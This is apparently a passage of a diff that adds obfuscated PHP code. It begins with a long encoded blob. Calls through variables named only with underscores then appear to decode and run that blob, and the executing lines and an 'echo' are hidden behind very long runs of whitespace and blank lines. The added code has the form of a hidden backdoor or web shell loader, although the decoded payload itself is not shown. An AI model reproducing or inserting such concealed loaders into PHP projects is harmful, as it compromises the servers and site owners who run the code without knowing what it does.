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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
